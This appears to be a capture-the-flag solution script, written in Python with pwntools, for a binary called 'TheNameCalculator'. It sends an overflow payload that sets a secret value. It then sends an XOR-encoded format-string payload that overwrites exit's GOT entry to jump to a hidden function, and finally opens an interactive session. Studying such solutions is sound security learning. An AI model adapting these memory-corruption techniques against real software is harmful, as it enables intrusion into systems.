#!/usr/bin/env python
from pwn import *

conn = remote("chal.noxale.com", 5678)
#conn = process("TheNameCalculator")

#step 1
conn.recvuntil("?")
secret = 0x6A4B825
exit_got = 0x804A024

payload = p32(exit_got)
payload += "A"*(0x1C-len(payload))
payload += p32(secret)

conn.send(payload)

#step2
superSecretFunc = 0x8048596
low = superSecretFunc%0x10000 #34198

conn.recvuntil("Say that again please")
payload = p32(0x36691253 ^ u32("%341"))
payload += p32(0x36363636 ^ u32("98x%"))
payload += p32(0x36363636 ^ u32("27$h"))
payload += p32(0x36363636 ^ u32("n__M"))
payload += p32(0x36363636 ^ u32("YRIA"))
payload += p32(0x65363636 )
payload += p32(0x65691253 )

conn.send(payload)
conn.recvuntil("MYRIA")

conn.interactive()


